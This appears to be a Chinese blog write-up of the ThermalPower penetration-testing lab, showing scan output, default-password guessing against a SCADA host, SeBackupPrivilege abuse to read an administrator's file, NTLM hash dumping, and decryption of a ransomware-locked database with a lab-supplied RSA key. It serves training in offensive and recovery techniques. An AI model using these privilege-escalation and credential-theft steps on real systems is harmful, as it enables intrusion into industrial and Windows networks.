<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./fscan -h 172.22.26.0/24
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   ___                              _  
</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __ 
</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /
</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;  
</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  
</span></span><span class="line"><span class="cl">                     fscan version: 1.8.4
</span></span><span class="line"><span class="cl">start infoscan
</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.26.11    is alive
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Icmp alive hosts len is: <span class="m">1</span>
</span></span><span class="line"><span class="cl">172.22.26.11:1433 open
</span></span><span class="line"><span class="cl">172.22.26.11:139 open
</span></span><span class="line"><span class="cl">172.22.26.11:135 open
</span></span><span class="line"><span class="cl">172.22.26.11:80 open
</span></span><span class="line"><span class="cl">172.22.26.11:445 open
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">5</span>
</span></span><span class="line"><span class="cl">start vulscan
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.26.11    WORKGROUP<span class="se">\W</span>IN-SCADA         
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> mssql 172.22.26.11:1433:sa <span class="m">123456</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.26.11
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>WIN-SCADA
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.26.11
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.26.11       code:200 len:703    title:IIS Windows Server
</span></span></code></pre></td></tr></table>
</div>
</div><p>rdp连过去172.22.26.11</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150600-wklgl23.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150600-wklgl23.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150600-wklgl23.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150600-wklgl23.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150600-wklgl23.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150600-wklgl23.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<p>开启锅炉得到flag</p>
<h3 id="第二关" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%8c%e5%85%b3" class="header-mark"></a>第二关</h3><p>尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。</p>
<p>在ftp中</p>
<p>从“内部员工通讯录.xlsx”中获取到员工信息</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143430-bdaihir.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143430-bdaihir.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143430-bdaihir.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143430-bdaihir.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143430-bdaihir.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143430-bdaihir.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<p>从“火创能源内部通知.docx”中获取到默认密码规则</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">2. 登陆账户设置：
</span></span><span class="line"><span class="cl">   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。
</span></span></code></pre></td></tr></table>
</div>
</div><p>随机登录一个chenhua/chenhua@0813</p>
<p>rdp连到172.22.17.6</p>
<p>根据题目信息，需要用特权组提权，查看账户的特权组</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143843-9r56g0f.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143843-9r56g0f.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143843-9r56g0f.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143843-9r56g0f.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143843-9r56g0f.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143843-9r56g0f.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<p>可以看到该用户是属于 Backup Operators 组的一部分，默认情况下会授予该组 SeBackup 和 SeRestore 权限，SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何适当的 DACL（自由访问控制列表）。 此权限存在的背后动机是允许某些用户在系统中执行备份操作，而无需授予其完全的管理权限。</p>
<p>一旦拥有 SeBackup 和 SeRestore 权限，攻击者就可以通过使用多种技术轻松进行提权操作。 包括复制 SAM 和 SYSTEM 注册表配置单元（registry hives）以提取本地管理员的密码 hash 值。</p>
<p>但这里并没有给用户默认分配 SeBackup 权限</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126144029-5doecb4.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126144029-5doecb4.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126144029-5doecb4.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126144029-5doecb4.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126144029-5doecb4.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126144029-5doecb4.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<p>‍</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd</span> C:<span class="se">\U</span>sers<span class="se">\c</span>henhua<span class="se">\D</span>esktop<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>PS C:<span class="se">\U</span>sers<span class="se">\c</span>henhua<span class="se">\D</span>esktop&gt; Import-Module .<span class="se">\S</span>eBackupPrivilegeUtils.dll
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\c</span>henhua<span class="se">\D</span>esktop&gt; Import-Module .<span class="se">\S</span>eBackupPrivilegeCmdLets.dll
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\c</span>henhua<span class="se">\D</span>esktop&gt; Set-SeBackupPrivilege
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\c</span>henhua<span class="se">\D</span>esktop&gt; Get-SeBackupPrivilege
</span></span><span class="line"><span class="cl">SeBackupPrivilege is enabled
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\c</span>henhua<span class="se">\D</span>esktop&gt; Copy-FileSeBackupPrivilege C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\f</span>lag<span class="se">\f</span>lag02.txt C:<span class="se">\U</span>sers<span class="se">\c</span>henhua<span class="se">\D</span>esktop<span class="se">\f</span>lag02.txt -Overwrite
</span></span><span class="line"><span class="cl">Copied <span class="m">350</span> bytes
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\c</span>henhua<span class="se">\D</span>esktop&gt; cat flag02.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用 impacket-secretsdump 从注册表转储文件中获取 ntlm 哈希：</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150031-g43fhax.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150031-g43fhax.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150031-g43fhax.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150031-g43fhax.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150031-g43fhax.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150031-g43fhax.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<h3 id="第四关" class="headerLink">
    <a href="#%e7%ac%ac%e5%9b%9b%e5%85%b3" class="header-mark"></a>第四关</h3><p>关卡剧情：尝试获取 SCADA 工程师站中的数据库备份，并分析备份文件是否泄漏了敏感数据。</p>
<p>rdp连回172.22.26.11</p>
<p>Win + D 返回desktop，发现桌面上有一个ScadaDB.sql.locky，还有一个勒索文件，说我们的文件已被加密</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151554-1w19122.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151554-1w19122.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151554-1w19122.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151554-1w19122.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151554-1w19122.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151554-1w19122.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<p>在 C 盘找到勒索病毒程序 Lockyou.exe</p>
<p>ida分析一下，发现该程序使用了 AES 加密文件</p>
<p>题目描述里给了一个privateKey和encryptedAesKey，使用privateKey用rsa加密了aeskey得到的encryptedAesKey</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#privateKey</span>
</span></span><span class="line"><span class="cl">&lt;RSAKeyValue&gt;&lt;Modulus&gt;uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE<span class="o">=</span>&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;P&gt;2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw<span class="o">==</span>&lt;/P&gt;&lt;Q&gt;2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw<span class="o">==</span>&lt;/Q&gt;&lt;DP&gt;ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ<span class="o">==</span>&lt;/DP&gt;&lt;DQ&gt;PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ<span class="o">==</span>&lt;/DQ&gt;&lt;InverseQ&gt;JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA<span class="o">==</span>&lt;/InverseQ&gt;&lt;D&gt;tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0<span class="o">=</span>&lt;/D&gt;&lt;/RSAKeyValue&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>先把XML转成PEM格式</p>
<p><a href="https://www.ssleye.com/ssltool/pem_xml.html" target="_blank" rel="noopener noreferrer">https://www.ssleye.com/ssltool/pem_xml.html</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-----BEGIN PRIVATE KEY-----
</span></span><span class="line"><span class="cl">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+
</span></span><span class="line"><span class="cl">PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3
</span></span><span class="line"><span class="cl">YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr
</span></span><span class="line"><span class="cl">rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17
</span></span><span class="line"><span class="cl">8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox
</span></span><span class="line"><span class="cl">RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN
</span></span><span class="line"><span class="cl">UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz
</span></span><span class="line"><span class="cl">J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ
</span></span><span class="line"><span class="cl">vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk
</span></span><span class="line"><span class="cl">Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/
</span></span><span class="line"><span class="cl">xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0
</span></span><span class="line"><span class="cl">VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd
</span></span><span class="line"><span class="cl">FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy
</span></span><span class="line"><span class="cl"><span class="nv">PHvLZB6D8zSyuGw</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">-----END PRIVATE KEY-----
</span></span></code></pre></td></tr></table>
</div>
</div><p>把encryptedAesKey解一下</p>
<p><a href="https://www.lddgo.net/encrypt/rsa" target="_blank" rel="noopener noreferrer">https://www.lddgo.net/encrypt/rsa</a></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126154332-jojfuic.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126154332-jojfuic.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126154332-jojfuic.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126154332-jojfuic.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126154332-jojfuic.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126154332-jojfuic.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<p>最后写个aes脚本解一下ScadaDB.sql.locky，把前16位作为iv</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">from Crypto.Cipher import AES
</span></span><span class="line"><span class="cl">from Crypto.Util.Padding import unpad
</span></span><span class="line"><span class="cl">import base64
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 读取加密文件内容</span>
</span></span><span class="line"><span class="cl"><span class="nv">encrypted_file</span> <span class="o">=</span> <span class="s1">&#39;ScadaDB.sql.locky&#39;</span>
</span></span><span class="line"><span class="cl">with open<span class="o">(</span>encrypted_file, <span class="s1">&#39;rb&#39;</span><span class="o">)</span> as file:
</span></span><span class="line"><span class="cl">    <span class="nv">encrypted_data</span> <span class="o">=</span> file.read<span class="o">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 解密密钥</span>
</span></span><span class="line"><span class="cl"><span class="nv">key</span> <span class="o">=</span> <span class="s1">&#39;cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">key</span> <span class="o">=</span> base64.b64decode<span class="o">(</span>key<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 按照每 16 位数据作为 IV 进行解密</span>
</span></span><span class="line"><span class="cl"><span class="nv">iv</span> <span class="o">=</span> encrypted_data<span class="o">[</span>:16<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 创建 AES 解密器</span>
</span></span><span class="line"><span class="cl"><span class="nv">cipher</span> <span class="o">=</span> AES.new<span class="o">(</span>key, AES.MODE_CBC, <span class="nv">IV</span><span class="o">=</span>iv<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 解密数据（去除 IV 后的部分）</span>
</span></span><span class="line"><span class="cl"><span class="nv">decrypted_data</span> <span class="o">=</span> unpad<span class="o">(</span>cipher.decrypt<span class="o">(</span>encrypted_data<span class="o">[</span>16:<span class="o">])</span>, AES.block_size<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 写入解密后的内容到新文件</span>
</span></span><span class="line"><span class="cl"><span class="nv">decrypted_file</span> <span class="o">=</span> <span class="s1">&#39;decrypted_file.txt&#39;</span>
</span></span><span class="line"><span class="cl">with open<span class="o">(</span>decrypted_file, <span class="s1">&#39;wb&#39;</span><span class="o">)</span> as file:
</span></span><span class="line"><span class="cl">    file.write<span class="o">(</span>decrypted_data<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">print<span class="o">(</span>f<span class="s1">&#39;文件解密完成，解密后的数据已保存到 {decrypted_file}&#39;</span><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>随后在解密后的文件里查找flag</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151654-2ksqtyn.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151654-2ksqtyn.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151654-2ksqtyn.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151654-2ksqtyn.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151654-2ksqtyn.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151654-2ksqtyn.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<p>‍</p></div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2025-01-26</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span><a class="link-to-mardown" href=/chunqiuyunjing-thermalpower/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\chunqiuyunjing-ThermalPower.md target="_blank" rel="noopener noreferrer">View source</a>
                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\chunqiuyunjing-ThermalPower.md target="_blank" rel="noopener noreferrer">Edit this page</a>
                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-ThermalPower%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F&body=|Field|Value|%0A|-|-|%0A|Title|%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-ThermalPower%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F|%0A|Url|http://scofield1920.github.io/chunqiuyunjing-thermalpower/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\chunqiuyunjing-ThermalPower.md| target="_blank" rel="noopener noreferrer">Report issue</a>
                    </span></div>
            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/chunqiuyunjing-thermalpower/" data-title="春秋云境-ThermalPower综合渗透" data-hashtags="penetration,wp"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/chunqiuyunjing-thermalpower/" data-hashtag="penetration"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/chunqiuyunjing-thermalpower/" data-title="春秋云境-ThermalPower综合渗透"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/chunqiuyunjing-thermalpower/" data-title="春秋云境-ThermalPower综合渗透"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/chunqiuyunjing-thermalpower/" data-title="春秋云境-ThermalPower综合渗透"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/chunqiuyunjing-thermalpower/" data-title="春秋云境-ThermalPower综合渗透" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
        function shareOnMastodon(title, link) {
            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
            const domain = prompt("Enter your Mastodon domain", savedDomain);
            if (domain === null) {
                return;
            }
            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
            const text = title + "\n\n" + link;
            const url = new URL("https://" + domain)
            url.pathname = "share"
            url.searchParams.append('text', text)
            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
        }
    </script>
    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;春秋云境-ThermalPower综合渗透&#34;, &#34;http://scofield1920.github.io/chunqiuyunjing-thermalpower/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/penetration/">Penetration</a>,&nbsp;<a href="/tags/wp/">Wp</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2024cqbdjs/" class="prev" rel="prev" title="2024 春秋杯网络安全联赛冬季赛"><i class="fas fa-angle-left fa-fw"></i>2024 春秋杯网络安全联赛冬季赛</a>
            <a href="/chunqiuyunjing-delivery/" class="next" rel="next" title="春秋云境-Delivery综合渗透">春秋云境-Delivery综合渗透<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="utterances"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div>
    
        
        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
    

    
        
            <section>
                
                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
                        
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                

                
                    &nbsp;|&nbsp;              
                

                
                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
                        
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
            </section>
        

        
        
    

</footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
